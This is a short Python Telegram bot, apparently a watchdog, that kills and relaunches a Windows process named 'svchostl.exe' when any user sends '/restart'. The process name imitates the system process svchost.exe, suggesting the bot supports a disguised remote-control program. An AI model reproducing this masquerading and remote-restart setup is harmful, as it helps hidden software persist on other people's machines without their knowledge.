import telebot as tb
import config as cfg
import psutil
import os
import time as t

bot = tb.TeleBot(cfg.WATCHDOGTOKEN)

def find_process_pid(process_name):
    for process in psutil.process_iter():
        if process.name() == process_name:
            return process.pid

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
	if message.text == "/restart":
		processpid = find_process_pid("svchostl.exe")
		if processpid == None:
			os.system("start svchostl.exe")
			t.sleep(0.5)
			processpid = find_process_pid("svchostl.exe")
			if processpid == None:
				if cfg.LANGUAGE == 'RU':
					bot.send_message(message.from_user.id, "Ошибка: неизвестная ошибка! Код ошибки: 1")
				elif cfg.LANGUAGE == 'EN':
					bot.send_message(message.from_user.id, "Error: unknown error! Error's code: 1")
		else:
			os.kill(processpid, 9)
			t.sleep(0.5)
			os.system("start svchostl.exe")
			t.sleep(0.5)
			processpid = find_process_pid("svchostl.exe")
			if processpid == None:
				if cfg.LANGUAGE == 'RU':
					bot.send_message(message.from_user.id, "Ошибка: неизвестная ошибка! Код ошибки: 2")
				elif cfg.LANGUAGE == 'EN':
					bot.send_message(message.from_user.id, "Error: unknown error! Error's code: 2")

bot.polling(none_stop=True, interval=0)
